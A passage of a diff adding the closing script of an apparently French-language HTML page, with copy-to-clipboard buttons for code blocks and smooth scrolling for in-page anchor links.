+            button.addEventListener('click', () => {
+                navigator.clipboard.writeText(block.textContent);
+                button.textContent = 'Copié !';
+                setTimeout(() => {
+                    button.textContent = 'Copier';
+                }, 2000);
+            });
+        });
+        
+        
+        document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+            anchor.addEventListener('click', function (e) {
+                e.preventDefault();
+                
+                document.querySelector(this.getAttribute('href')).scrollIntoView({
+                    behavior: 'smooth'
+                });
+            });
+        });
+    });
+    </script>
+    
+    
+</body>
+</html>  
